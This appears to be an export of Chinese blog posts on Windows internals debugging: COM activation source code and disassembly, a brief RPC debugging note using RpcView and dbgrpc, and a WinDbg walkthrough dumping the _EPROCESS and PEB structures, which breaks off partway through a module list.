ole32!CCompositeMoniker::BindToObject+0xe8 (76da6918)76da6a20 b857000780 mov eax, 80070057h76da6a25 5f pop edi76da6a26 5e pop esi76da6a27 5b pop ebx76da6a28 c9 leave 76da6a29 c21400 ret 14h76da6a2c cc int 376da6a2d cc int 376da6a2e cc int 376da6a2f cc int 3 CComActivator::StandardCreateInstance 定义： 1234567891011121314151617181920212223STDMETHODIMP CComActivator::StandardCreateInstance (REFCLSID Clsid, IUnknown *punkOuter, DWORD dwClsCtx, COSERVERINFO *pServerInfo, DWORD dwCount, MULTI_QI *pResults)&#123; // Create ActivationPropertiesIn on stack ActivationPropertiesIn actIn; actIn.SetNotDelete(); // Initialize Actprops with set stuff InitializeActivation(&amp;actIn); return DoCreateInstance(Clsid, punkOuter, dwClsCtx, pServerInfo, dwCount, pResults, &amp;actIn);&#125; DoCreateInstance 定义： 1234567891011121314151617181920212223//--------------------------------------------------------------------// Front end for CreateInstance//-------------------------------------------------------------------- static inline HRESULT DoCreateInstance (REFCLSID Clsid, IUnknown *punkOuter, DWORD dwClsCtx, COSERVERINFO *pServerInfo, DWORD dwCount, MULTI_QI *pResults, ActivationPropertiesIn *pActIn) &#123; DWORD actvFlags = GetActvFlags(dwClsCtx); return ICoCreateInstanceEx( Clsid, punkOuter, dwClsCtx, pServerInfo, dwCount, actvFlags, pResults, pActIn); &#125; ICoCreateInstanceEx 定义： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374//+-------------------------------------------------------------------------//// Function: ICoCreateInstanceEx//// Synopsis: Internal version of CoCreateInstance////// Arguments: [Clsid] - requested CLSID// [pServerInfo] - server information block// [punkOuter] - controlling unknown for aggregating// [dwCtrl] - kind of server required// [dwCount] - count of interfaces// [dwActvFlags] - activation flags// [pResults] - MULTI_QI struct of interfaces//// Returns: S_OK - object bound successfully//////--------------------------------------------------------------------------INTERNAL ICoCreateInstanceEx( REFCLSID Clsid, IUnknown * punkOuter, // only relevant locally DWORD dwClsCtx, COSERVERINFO * pServerInfo, DWORD dwCount, DWORD dwActvFlags, MULTI_QI * pResults, ActivationPropertiesIn *pActIn )&#123; int nRetries = 0; Win4Assert(gAssertOnCreate &amp;&amp; &quot;Assertion Testing&quot;); CLSID ConfClsid; HRESULT hrSave = E_FAIL; HRESULT hr = ValidateAndRemapParams(Clsid,dwClsCtx,pServerInfo,dwCount,pResults); if ( FAILED(hr) ) &#123; return hr; &#125; // an OLE 1.0 CLSID, in which case we get back our internal // class factory. IClassFactory *pcf = NULL; if (IsInternalCLSID(Clsid, dwClsCtx, IID_IClassFactory, hr, (void **)&amp;pcf)) &#123; // this is an internally implemented clsid, or an OLE 1.0 class // so we already got the class factory (if available) and set // the return code appropriately. // get the interfaces if ( SUCCEEDED(hr) &amp;&amp; pcf ) &#123; hr = hrSave = CreateInprocInstanceHelper(pcf, dwActvFlags, punkOuter, dwCount, pResults); &#125; &#125; else &#123; // The class is not internal. If the CLSCTX_NO_CUSTOM_MARSHAL flag is set // return E_ACCESSDENIED. if ((dwClsCtx &amp; CLSCTX_NO_CUSTOM_MARSHAL) &amp;&amp; !IsComsvcsCLSID(Clsid) &amp;&amp; !IsMarshalerCLSID(Clsid)) &#123; // don&#x27;t allow custom marshalers that do not belong to // com services. return E_ACCESSDENIED; &#125; // Look in our catalogs for a mapping for this clsid to a configured clsid, // since we store configured clsids in our class caching table. Don&#x27;t fail if // we couldn&#x27;t do the mapping. hr = LookForConfiguredClsid(Clsid, ConfClsid); if (FAILED(hr) &amp;&amp; (hr != REGDB_E_CLASSNOTREG)) goto exit_point; // It&#x27;s OK to pass in GUID_DefaultAppPartition, since // SearchForLoadedClass ignores COM+ classes anyway. CClassCache::CDllClassEntry *pDCE = NULL; ACTIVATION_PROPERTIES ap(ConfClsid, GUID_DefaultAppPartition, IID_IClassFactory, ACTIVATION_PROPERTIES::fDO_NOT_LOAD, dwClsCtx, dwActvFlags, 0, NULL, (IUnknown **) &amp;pcf); hr = CClassCache::SearchForLoadedClass(ap, &amp;pDCE); if ( SUCCEEDED(hr) ) &#123; // Check if it&#x27;s one we need to activate right here if ((!pcf) &amp;&amp; INTERNAL_CLSCTX(dwClsCtx)) &#123; // This goes to the class cache to actually lookup the DPE and // get the factory // // Proxy/Stubs are never partitioned. ACTIVATION_PROPERTIES ap(ConfClsid, GUID_DefaultAppPartition, IID_IClassFactory, 0, dwClsCtx, dwActvFlags, 0, NULL, (IUnknown **) &amp;pcf); hr = hrSave = CCGetClassObject(ap); if (FAILED(hr)) goto exit_point; &#125; if (pcf) &#123; // // an object was found get the interfaces // Win4Assert(!pDCE); hr = hrSave = CreateInprocInstanceHelper(pcf, dwActvFlags, punkOuter, dwCount, pResults); &#125; else &#123; // // do COM+ activation // // Initialize activation properties // Allocate In on stack IActivationPropertiesOut * pOutActivationProperties = NULL; // output if (!pActIn) &#123; pActIn=(ActivationPropertiesIn*) _alloca(sizeof(ActivationPropertiesIn)); pActIn-&gt;ActivationPropertiesIn::ActivationPropertiesIn(); pActIn-&gt;SetNotDelete(TRUE); &#125; AddHydraSessionID(pActIn); AddPartitionID(pActIn); AddOrigClsCtx(pActIn, dwClsCtx); // split the array of structs into individual arrays CSplit_QI SplitQI( hr, dwCount, pResults ); if ( FAILED(hr) ) goto exit_point; DLL_INSTANTIATION_PROPERTIES *pdip; IComClassInfo *pCI = NULL; if ( pDCE ) &#123; pdip = (DLL_INSTANTIATION_PROPERTIES *) _alloca(sizeof(DLL_INSTANTIATION_PROPERTIES)); pdip-&gt;_pDCE = pDCE; pCI = pdip-&gt;_pDCE-&gt;_pClassEntry-&gt;_pCI; if ( pCI ) &#123; pCI-&gt;AddRef(); &#125; &#125; else &#123; pdip = NULL; &#125; BOOL fRetry=FALSE, fDownloadDone = FALSE, bClassEnabled = TRUE; DWORD relCount = 0; do &#123; if ( fRetry ) &#123; DWORD relCount = pActIn-&gt;Release(); Win4Assert(relCount==0); pActIn = new ActivationPropertiesIn; if ( pActIn == NULL ) return E_OUTOFMEMORY; AddOrigClsCtx(pActIn, dwClsCtx); fRetry = FALSE; // start with the assumption of termination &#125; Win4Assert(pActIn != NULL); hr = GetActivationPropertiesIn( pActIn, ConfClsid, dwClsCtx, pServerInfo, dwCount, SplitQI._pIIDArray, dwActvFlags, pdip, pCI); if(SUCCEEDED(hr)) &#123; HRESULT TempHR; //This is here because it is OK to fail and we use hr later IComClassInfo2 *pCI2 = NULL; if(!pCI) &#123; pCI = pActIn-&gt;GetComClassInfo(); Win4Assert(pCI != NULL); pCI-&gt;AddRef(); &#125; TempHR = pCI-&gt;QueryInterface(IID_IComClassInfo2, (void **)&amp;pCI2); if(SUCCEEDED(TempHR)) &#123; pCI2-&gt;IsEnabled(&amp;bClassEnabled); pCI2-&gt;Release(); &#125; &#125; if ( pCI ) &#123; pCI-&gt;Release(); pCI = NULL; &#125; if ( FAILED(hr) ) &#123; pActIn-&gt;Release(); goto exit_point; &#125; if(bClassEnabled == FALSE) &#123; pActIn-&gt;Release(); hr = CO_E_CLASS_DISABLED; goto exit_point; &#125;RETRY_ACTIVATION: IActivationStageInfo *pStageInfo = (IActivationStageInfo*) pActIn; // Start off activation at the beginning of client context stage hr = pStageInfo-&gt;SetStageAndIndex(CLIENT_CONTEXT_STAGE,0); if (FAILED (hr)) &#123; pActIn-&gt;Release(); goto exit_point; &#125; // This is the whole activation process hr = hrSave = pActIn-&gt;DelegateCreateInstance( punkOuter, &amp;pOutActivationProperties); // If the delegated activation returns ERROR_RETRY, // we walk the chain again, but AT MOST ONCE. // This is to support the private activations. if (HRESULT_FROM_WIN32(ERROR_RETRY) == hr) &#123; Win4Assert(!nRetries); if (!nRetries) &#123; BOOL fEnabled = TRUE; GetClassInfoFlags(pActIn, &amp;fEnabled, NULL, NULL); if (!fEnabled) &#123; hr = CO_E_CLASS_DISABLED; pActIn-&gt;Release(); goto exit_point; &#125; nRetries++; goto RETRY_ACTIVATION; &#125; &#125; #ifdef DIRECTORY_SERVICE if ( FAILED(hr) &amp;&amp; !(dwClsCtx &amp; CLSCTX_NO_CODE_DOWNLOAD) ) &#123; //download class if not registered locally -- but only once! if ( (REGDB_E_CLASSNOTREG == hr) &amp;&amp; !fDownloadDone ) &#123; //if successful, this will add a darwin id to the registry hr = DownloadClass(Clsid,dwClsCtx); fDownloadDone = fRetry = SUCCEEDED(hr); &#125; if ( hr == CS_E_PACKAGE_NOTFOUND ) &#123; hr = REGDB_E_CLASSNOTREG; &#125; &#125;#endif //DIRECTORY_SERVICE &#125; while ( fRetry ); if ( SUCCEEDED(hr) ) &#123; Win4Assert(pOutActivationProperties != NULL); if (pOutActivationProperties == NULL) &#123; hr = E_UNEXPECTED; &#125; else &#123; hr = pOutActivationProperties-&gt;GetObjectInterfaces(dwCount, dwActvFlags, pResults); &#125; &#125; if ( pOutActivationProperties ) &#123; relCount = pOutActivationProperties-&gt;Release(); Win4Assert(relCount==0); &#125; // Since doing an alloca, must release in after out // since actout may be contained by actin for // performance optimization relCount = pActIn-&gt;Release(); Win4Assert(relCount==0); if ( pDCE ) &#123; LOCK(CClassCache::_mxs); pDCE-&gt;Unlock(); UNLOCK(CClassCache::_mxs); &#125; &#125; &#125; &#125; exit_point: if ( pcf != NULL ) &#123; pcf-&gt;Release(); &#125; // // hrSave is the result of the entire activation chain, hr is the // result of any work done after the activation (unmarshalling the // interfaces, etc). If hr succeeded, then we want to update the // MULTI_QI array with the result of the actual activation, not the // rest. If hr failed, then we want to use it regardless of the value // of hrSave. // if (SUCCEEDED(hr)) hr = hrSave; hr = UpdateResultsArray( hr, dwCount, pResults ); return hr;&#125; combase!ScmRequestInfo::SetScmInfo 定义： 123456789// Methods from IScmRequestInfoSTDMETHOD(SetScmInfo)(IN PRIV_SCM_INFO *pScmInfo)&#123; freeScmInfo((PRIV_SCM_INFO *)_scmRequestInfoData.pScmInfo); _scmRequestInfoData.pScmInfo = (CustomPrivScmInfo*)pScmInfo; freeRemoteRequest((REMOTE_REQUEST_SCM_INFO *)_scmRequestInfoData.remoteRequest); _scmRequestInfoData.remoteRequest = NULL; return S_OK;&#125;"},{"title":"【调试技术】RPC","date":"2023-11-07T16:00:00.000Z","path":"wiki/调试技术/【调试技术】RPC.html","text":"概述：windwos RPC 调试记录 前言windows RPC 是常用的远程调用，有关 rpc 的使用可以在博客中搜索RPC关键字查看相关使用。RPC工具也可以使用开源 &#x3D;&#x3D;RPCView&#x3D;&#x3D;。 RPC及相关工具可以看到 RpcView 可以看到 RPC 进程使用的协议 ncacn_np ，以及 ncacn_np 协议对应的管道名 \\\\pipe\\\\hello。那本次调试的目标就是对标 RpcView。在 windbg 中可以查看一个进程RPC详细详细。 调试步骤rpc调试主要用到的 windows kits 中带的文件 dbgrpc.exe。详见微软官方文档 使用 DbgRpc 工具 - Windows drivers | Microsoft Learn 相关命令及输出说明"},{"title":"【调试技术】使用Windbg查看PEB","date":"2024-04-16T03:41:37.438Z","path":"wiki/调试技术/【调试技术】PEB.html","text":"概述：PEB是什么？以及PEB在进程中的实例 先看一下 执行体进程结构和它内嵌的内核进程结构的关键域 方便理解，具体的结构可使用 dt nt!_EPROCESS 查看 0x01、如何在windbg中查看该进程结构？ 环境：windbg双机调试模式，相关步骤查找 windows双机调试 或 bcdsedit。 以 notepad.exe(记事本) 为例，win+R 运行 notepad。输入以下命令得到 notepad 的进程相关信息 1&gt;!process 0 0 notepad.exe 输出如下所示： 在这里获取到 notepad 的进程id为 ffff9105b1f38080。 有图可知，整个 notepad.exe 的保存结构为一个 _EPROCESS，进行下一步，查看进程： 1&gt;dt nt!_EPROCESS ffff9105b1f38080 输出如下所示： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238&gt;1: kd&gt; !openpid ffff9105b1f38080&gt;No export openpid found&gt;1: kd&gt; dt nt!_EPROCESS ffff9105b1f38080&gt;+0x000 Pcb : _KPROCESS&gt;+0x438 ProcessLock : _EX_PUSH_LOCK&gt;+0x440 UniqueProcessId : 0x00000000`000021c8 Void&gt;+0x448 ActiveProcessLinks : _LIST_ENTRY [ 0xffff9105`af299748 - 0xffff9105`af8484c8 ]&gt;+0x458 RundownProtect : _EX_RUNDOWN_REF&gt;+0x460 Flags2 : 0xd000&gt;+0x460 JobNotReallyActive : 0y0&gt;+0x460 AccountingFolded : 0y0&gt;+0x460 NewProcessReported : 0y0&gt;+0x460 ExitProcessReported : 0y0&gt;+0x460 ReportCommitChanges : 0y0&gt;+0x460 LastReportMemory : 0y0&gt;+0x460 ForceWakeCharge : 0y0&gt;+0x460 CrossSessionCreate : 0y0&gt;+0x460 NeedsHandleRundown : 0y0&gt;+0x460 RefTraceEnabled : 0y0&gt;+0x460 PicoCreated : 0y0&gt;+0x460 EmptyJobEvaluated : 0y0&gt;+0x460 DefaultPagePriority : 0y101&gt;+0x460 PrimaryTokenFrozen : 0y1&gt;+0x460 ProcessVerifierTarget : 0y0&gt;+0x460 RestrictSetThreadContext : 0y0&gt;+0x460 AffinityPermanent : 0y0&gt;+0x460 AffinityUpdateEnable : 0y0&gt;+0x460 PropagateNode : 0y0&gt;+0x460 ExplicitAffinity : 0y0&gt;+0x460 ProcessExecutionState : 0y00&gt;+0x460 EnableReadVmLogging : 0y0&gt;+0x460 EnableWriteVmLogging : 0y0&gt;+0x460 FatalAccessTerminationRequested : 0y0&gt;+0x460 DisableSystemAllowedCpuSet : 0y0&gt;+0x460 ProcessStateChangeRequest : 0y00&gt;+0x460 ProcessStateChangeInProgress : 0y0&gt;+0x460 InPrivate : 0y0&gt;+0x464 Flags : 0x144d0c01&gt;+0x464 CreateReported : 0y1&gt;+0x464 NoDebugInherit : 0y0&gt;+0x464 ProcessExiting : 0y0&gt;+0x464 ProcessDelete : 0y0&gt;+0x464 ManageExecutableMemoryWrites : 0y0&gt;+0x464 VmDeleted : 0y0&gt;+0x464 OutswapEnabled : 0y0&gt;+0x464 Outswapped : 0y0&gt;+0x464 FailFastOnCommitFail : 0y0&gt;+0x464 Wow64VaSpace4Gb : 0y0&gt;+0x464 AddressSpaceInitialized : 0y11&gt;+0x464 SetTimerResolution : 0y0&gt;+0x464 BreakOnTermination : 0y0&gt;+0x464 DeprioritizeViews : 0y0&gt;+0x464 WriteWatch : 0y0&gt;+0x464 ProcessInSession : 0y1&gt;+0x464 OverrideAddressSpace : 0y0&gt;+0x464 HasAddressSpace : 0y1&gt;+0x464 LaunchPrefetched : 0y1&gt;+0x464 Background : 0y0&gt;+0x464 VmTopDown : 0y0&gt;+0x464 ImageNotifyDone : 0y1&gt;+0x464 PdeUpdateNeeded : 0y0&gt;+0x464 VdmAllowed : 0y0&gt;+0x464 ProcessRundown : 0y0&gt;+0x464 ProcessInserted : 0y1&gt;+0x464 DefaultIoPriority : 0y010&gt;+0x464 ProcessSelfDelete : 0y0&gt;+0x464 SetTimerResolutionLink : 0y0&gt;+0x468 CreateTime : _LARGE_INTEGER 0x01d9f901`1100d7bf&gt;+0x470 ProcessQuotaUsage : [2] 0x3a58&gt;+0x480 ProcessQuotaPeak : [2] 0x3a98&gt;+0x490 PeakVirtualSize : 0x00000201`09c0f000&gt;+0x498 VirtualSize : 0x00000201`09c0f000&gt;+0x4a0 SessionProcessLinks : _LIST_ENTRY [ 0xffff9105`b1681520 - 0xffff9105`af848520 ]&gt;+0x4b0 ExceptionPortData : 0xffff9105`aa569da0 Void&gt;+0x4b0 ExceptionPortValue : 0xffff9105`aa569da0&gt;+0x4b0 ExceptionPortState : 0y000&gt;+0x4b8 Token : _EX_FAST_REF&gt;+0x4c0 MmReserved : 0&gt;+0x4c8 AddressCreationLock : _EX_PUSH_LOCK&gt;+0x4d0 PageTableCommitmentLock : _EX_PUSH_LOCK&gt;+0x4d8 RotateInProgress : (null) &gt;+0x4e0 ForkInProgress : (null) &gt;+0x4e8 CommitChargeJob : (null) &gt;+0x4f0 CloneRoot : _RTL_AVL_TREE&gt;+0x4f8 NumberOfPrivatePages : 0x238&gt;+0x500 NumberOfLockedPages : 0&gt;+0x508 Win32Process : 0xfffffe41`85f6d620 Void&gt;+0x510 Job : (null) &gt;+0x518 SectionObject : 0xffffb084`5ea9d3b0 Void&gt;+0x520 SectionBaseAddress : 0x00007ff6`477c0000 Void&gt;+0x528 Cookie : 0x4118bb70&gt;+0x530 WorkingSetWatch : (null) &gt;+0x538 Win32WindowStation : 0x00000000`000000b4 Void&gt;+0x540 InheritedFromUniqueProcessId : 0x00000000`000018f4 Void&gt;+0x548 OwnerProcessId : 0x18f6&gt;+0x550 Peb : 0x0000002c`74cc7000 _PEB&gt;+0x558 Session : 0xffffc180`6a1ec000 _MM_SESSION_SPACE&gt;+0x560 Spare1 : (null) &gt;+0x568 QuotaBlock : 0xffff9105`aa072cc0 _EPROCESS_QUOTA_BLOCK&gt;+0x570 ObjectTable : 0xffffb084`5f8dbcc0 _HANDLE_TABLE&gt;+0x578 DebugPort : (null) &gt;+0x580 WoW64Process : (null) &gt;+0x588 DeviceMap : 0xffffb084`5e99c190 Void&gt;+0x590 EtwDataSource : 0xffff9105`b4004550 Void&gt;+0x598 PageDirectoryPte : 0&gt;+0x5a0 ImageFilePointer : 0xffff9105`acb3fc30 _FILE_OBJECT&gt;+0x5a8 ImageFileName : [15] &quot;notepad.exe&quot;&gt;+0x5b7 PriorityClass : 0x2 &#x27;&#x27;&gt;+0x5b8 SecurityPort : (null) &gt;+0x5c0 SeAuditProcessCreationInfo : _SE_AUDIT_PROCESS_CREATION_INFO&gt;+0x5c8 JobLinks : _LIST_ENTRY [ 0x00000000`00000000 - 0x00000000`00000000 ]&gt;+0x5d8 HighestUserAddress : 0x00007fff`ffff0000 Void&gt;+0x5e0 ThreadListHead : _LIST_ENTRY [ 0xffff9105`af887a68 - 0xffff9105`aad93528 ]&gt;+0x5f0 ActiveThreads : 6&gt;+0x5f4 ImagePathHash : 0xc5670914&gt;+0x5f8 DefaultHardErrorProcessing : 1&gt;+0x5fc LastThreadExitStatus : 0n1&gt;+0x600 PrefetchTrace : _EX_FAST_REF&gt;+0x608 LockedPagesList : (null) &gt;+0x610 ReadOperationCount : _LARGE_INTEGER 0x0&gt;+0x618 WriteOperationCount : _LARGE_INTEGER 0x0&gt;+0x620 OtherOperationCount : _LARGE_INTEGER 0x30&gt;+0x628 ReadTransferCount : _LARGE_INTEGER 0x0&gt;+0x630 WriteTransferCount : _LARGE_INTEGER 0x0&gt;+0x638 OtherTransferCount : _LARGE_INTEGER 0x210&gt;+0x640 CommitChargeLimit : 0&gt;+0x648 CommitCharge : 0x31a&gt;+0x650 CommitChargePeak : 0x31a&gt;+0x680 Vm : _MMSUPPORT_FULL&gt;+0x7c0 MmProcessLinks : _LIST_ENTRY [ 0xffff9105`af299ac0 - 0xffff9105`af848840 ]&gt;+0x7d0 ModifiedPageCount : 1&gt;+0x7d4 ExitStatus : 0n259&gt;+0x7d8 VadRoot : _RTL_AVL_TREE&gt;+0x7e0 VadHint : 0xffff9105`ad4c8c20 Void&gt;+0x7e8 VadCount : 0x6a&gt;+0x7f0 VadPhysicalPages : 0&gt;+0x7f8 VadPhysicalPagesLimit : 0&gt;+0x800 AlpcContext : _ALPC_PROCESS_CONTEXT&gt;+0x820 TimerResolutionLink : _LIST_ENTRY [ 0x00000000`00000000 - 0x00000000`00000000 ]&gt;+0x830 TimerResolutionStackRecord : (null) &gt;+0x838 RequestedTimerResolution : 0&gt;+0x83c SmallestTimerResolution : 0&gt;+0x840 ExitTime : _LARGE_INTEGER 0x0&gt;+0x848 InvertedFunctionTable : (null) &gt;+0x850 InvertedFunctionTableLock : _EX_PUSH_LOCK&gt;+0x858 ActiveThreadsHighWatermark : 6&gt;+0x85c LargePrivateVadCount : 0&gt;+0x860 ThreadListLock : _EX_PUSH_LOCK&gt;+0x868 WnfContext : 0xffffb084`5fe9e180 Void&gt;+0x870 ServerSilo : (null) &gt;+0x878 SignatureLevel : 0 &#x27;&#x27;&gt;+0x879 SectionSignatureLevel : 0 &#x27;&#x27;&gt;+0x87a Protection : _PS_PROTECTION&gt;+0x87b HangCount : 0y000&gt;+0x87b GhostCount : 0y000&gt;+0x87b PrefilterException : 0y0&gt;+0x87c Flags3 : 0x41c000&gt;+0x87c Minimal : 0y0&gt;+0x87c ReplacingPageRoot : 0y0&gt;+0x87c Crashed : 0y0&gt;+0x87c JobVadsAreTracked : 0y0&gt;+0x87c VadTrackingDisabled : 0y0&gt;+0x87c AuxiliaryProcess : 0y0&gt;+0x87c SubsystemProcess : 0y0&gt;+0x87c IndirectCpuSets : 0y0&gt;+0x87c RelinquishedCommit : 0y0&gt;+0x87c HighGraphicsPriority : 0y0&gt;+0x87c CommitFailLogged : 0y0&gt;+0x87c ReserveFailLogged : 0y0&gt;+0x87c SystemProcess : 0y0&gt;+0x87c HideImageBaseAddresses : 0y0&gt;+0x87c AddressPolicyFrozen : 0y1&gt;+0x87c ProcessFirstResume : 0y1&gt;+0x87c ForegroundExternal : 0y1&gt;+0x87c ForegroundSystem : 0y0&gt;+0x87c HighMemoryPriority : 0y0&gt;+0x87c EnableProcessSuspendResumeLogging : 0y0&gt;+0x87c EnableThreadSuspendResumeLogging : 0y0&gt;+0x87c SecurityDomainChanged : 0y0&gt;+0x87c SecurityFreezeComplete : 0y1&gt;+0x87c VmProcessorHost : 0y0&gt;+0x87c VmProcessorHostTransition : 0y0&gt;+0x87c AltSyscall : 0y0&gt;+0x87c TimerResolutionIgnore : 0y0&gt;+0x87c DisallowUserTerminate : 0y0&gt;+0x880 DeviceAsid : 0n0&gt;+0x888 SvmData : (null) &gt;+0x890 SvmProcessLock : _EX_PUSH_LOCK&gt;+0x898 SvmLock : 0&gt;+0x8a0 SvmProcessDeviceListHead : _LIST_ENTRY [ 0xffff9105`b1f38920 - 0xffff9105`b1f38920 ]&gt;+0x8b0 LastFreezeInterruptTime : 0&gt;+0x8b8 DiskCounters : 0xffff9105`b1f38ac0 _PROCESS_DISK_COUNTERS&gt;+0x8c0 PicoContext : (null) &gt;+0x8c8 EnclaveTable : (null) &gt;+0x8d0 EnclaveNumber : 0&gt;+0x8d8 EnclaveLock : _EX_PUSH_LOCK&gt;+0x8e0 HighPriorityFaultsAllowed : 0&gt;+0x8e8 EnergyContext : 0xffff9105`b1f38ae8 _PO_PROCESS_ENERGY_CONTEXT&gt;+0x8f0 VmContext : (null) &gt;+0x8f8 SequenceNumber : 0xe9&gt;+0x900 CreateInterruptTime : 0xe8096541&gt;+0x908 CreateUnbiasedInterruptTime : 0xe8096541&gt;+0x910 TotalUnbiasedFrozenTime : 0&gt;+0x918 LastAppStateUpdateTime : 0xe8096541&gt;+0x920 LastAppStateUptime : 0y0000000000000000000000000000000000000000000000000000000000000 (0)&gt;+0x920 LastAppState : 0y000&gt;+0x928 SharedCommitCharge : 0xa2d&gt;+0x930 SharedCommitLock : _EX_PUSH_LOCK&gt;+0x938 SharedCommitLinks : _LIST_ENTRY [ 0xffffb084`5cc16358 - 0xffffb084`5e777688 ]&gt;+0x948 AllowedCpuSets : 0&gt;+0x950 DefaultCpuSets : 0&gt;+0x948 AllowedCpuSetsIndirect : (null) &gt;+0x950 DefaultCpuSetsIndirect : (null) &gt;+0x958 DiskIoAttribution : (null) &gt;+0x960 DxgProcess : 0xffffb084`5fe76de0 Void&gt;+0x968 Win32KFilterSet : 0&gt;+0x970 ProcessTimerDelay : _PS_INTERLOCKED_TIMER_DELAY_VALUES&gt;+0x978 KTimerSets : 0&gt;+0x97c KTimer2Sets : 0&gt;+0x980 ThreadTimerSets : 5&gt;+0x988 VirtualTimerListLock : 0&gt;+0x990 VirtualTimerListHead : _LIST_ENTRY [ 0xffff9105`b1f38a10 - 0xffff9105`b1f38a10 ]&gt;+0x9a0 WakeChannel : _WNF_STATE_NAME&gt;+0x9a0 WakeInfo : _PS_PROCESS_WAKE_INFORMATION&gt;+0x9d0 MitigationFlags : 0x21&gt;+0x9d0 MitigationFlagsValues : &lt;anonymous-tag&gt;&gt;+0x9d4 MitigationFlags2 : 0x40000000&gt;+0x9d4 MitigationFlags2Values : &lt;anonymous-tag&gt;&gt;+0x9d8 PartitionObject : 0xffff9105`a589c260 Void&gt;+0x9e0 SecurityDomain : 0x00000001`00000032&gt;+0x9e8 ParentSecurityDomain : 0x00000001`00000032&gt;+0x9f0 CoverageSamplerContext : (null) &gt;+0x9f8 MmHotPatchContext : (null) &gt;+0xa00 DynamicEHContinuationTargetsTree : _RTL_AVL_TREE&gt;+0xa08 DynamicEHContinuationTargetsLock : _EX_PUSH_LOCK&gt;+0xa10 DynamicEnforcedCetCompatibleRanges : _PS_DYNAMIC_ENFORCED_ADDRESS_RANGES&gt;+0xa20 DisabledComponentFlags : 0&gt;+0xa28 PathRedirectionHashes : (null) 这里可以看到很多信息，比如进程的 Pcb（进程控制块）的结构体为 _KPROCESS。进程的映像名(ImageFileName)为 notepad.exe 0x02、PEB与上述 _EPROCESS 的关系 上述看到的信息 _EPROCESS 均位于系统空间中。 而进程环境块（PEB）是一个比较特殊的存在，它位于&#x3D;&#x3D;进程的地址空间中&#x3D;&#x3D;。因为PEB的特殊性，比如环境变量、进程信息、线程等不同，因此PEB可以看做是一个私有的变量，定义了每个程序内部所需要的成员。有关PEB结构体可以在主页中搜索 WOW64通过PEB获取32/64位进程模块信息 查看。 补充： 在 windbg 调试中，默认使用 !PEB 命令时，查看的是 CPU 0 上当前运行的线程所属进程的进程环境块（PEB）。 如果要查看具体某一进程的环境块，需要先切换到该进程空间，再使用 !PEB 命令查看。 PEB概述PEB(Process Environment Block), 即进程环境块。不同于 EPROCESS和相关的数据结构（存储于系统空间中），进程环境块位于进程地址空间中（因为它包含一些需要由模式模式代码来修改的信息）。PEB包含了映像加载器、堆管理器以及其他需要从用户迷失访问它的Windows组件所需的信息。PEB域如下所示： PEB 实例在内核调试器中利用 !PEB 命令，你可以将 PEB 结构转储出来，会显示 CPU 0 上当前运行着的线程所属进程的PEB。 如下所示为进程 CPU 0 上运行线程所属进程的PEB 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011: kd&gt; !pebPEB at 000000e4829b9000 InheritedAddressSpace: No ReadImageFileExecOptions: No BeingDebugged: No ImageBaseAddress: 00007ff6cfaf0000 NtGlobalFlag: 0 NtGlobalFlag2: 0 Ldr 00007ffe587bb4c0 Ldr.Initialized: Yes Ldr.InInitializationOrderModuleList: 00000264d3e03ba0 . 00000264d3e690a0 Ldr.InLoadOrderModuleList: 00000264d3e03d10 . 00000264d3e69080 Ldr.InMemoryOrderModuleList: 00000264d3e03d20 . 00000264d3e69090 Base TimeStamp Module 7ff6cfaf0000 058e175a Dec 15 00:22:50 1972 C:\\Windows\\System32\\svchost.exe 7ffe58650000 4544b4a1 Oct 29 22:03:13 2006 C:\\Windows\\SYSTEM32\\ntdll.dll 7ffe56bc0000 d714134a May 06 10:04:58 2084 C:\\Windows\\System32\\KERNEL32.DLL 7ffe561a0000 0e9c5eae Oct 08 11:21:18 1977 C:\\Windows\\System32\\KERNELBASE.dll 7ffe56e80000 54cbb3a3 Jan 31 00:38:59 2015 C:\\Windows\\System32\\sechost.dll 7ffe56c80000 f564aeb4 Jun 18 23:37:24 2100 C:\\Windows\\System32\\RPCRT4.dll 7ffe55ff0000 2bd748bf Apr 23 09:39:11 1993 C:\\Windows\\System32\\ucrtbase.dll 7ffe576c0000 1cae0c4a Apr 01 09:54:18 1985 C:\\Windows\\System32\\combase.dll 7ffe53d00000 f0713fcd Oct 30 14:42:21 2097 C:\\Windows\\SYSTEM32\\kernel.appcore.dll 7ffe57da0000 564f9f39 Nov 21 06:31:21 2015 C:\\Windows\\System32\\msvcrt.dll 7ffe56120000 8fb0d55f May 24 07:27:27 2046 C:\\Windows\\System32\\bcryptPrimitives.dll 7ffe57050000 13a6e19d Jun 13 08:23:57 1980 C:\\Windows\\System32\\user32.dll 7ffe560f0000 0dcd0213 May 04 04:26:59 1977 C:\\Windows\\System32\\win32u.dll 7ffe57d10000 a19db164 Dec 04 01:05:40 2055 C:\\Windows\\System32\\GDI32.dll 7ffe55e80000 c4d50445 Aug 24 08:03:17 2074 C:\\Windows\\System32\\gdi32full.dll 7ffe55d90000 39255ccf May 19 23:25:03 2000 C:\\Windows\\System32\\msvcp_win.dll 7ffe1e780000 fe47fc1d Mar 10 20:14:21 2105 c:\\windows\\system32\\wscsvc.dll 7ffe54a30000 9f6e1bc3 Oct 05 14:10:11 2054 c:\\windows\\system32\\FirewallAPI.dll 7ffe551e0000 40054298 Jan 14 21:22:32 2004 c:\\windows\\system32\\DNSAPI.dll 7ffe551d0000 fcf57d1b Jun 27 02:06:19 2104 c:\\windows\\system32\\netutils.dll 7ffe55190000 cf9a121a May 15 14:41:30 2080 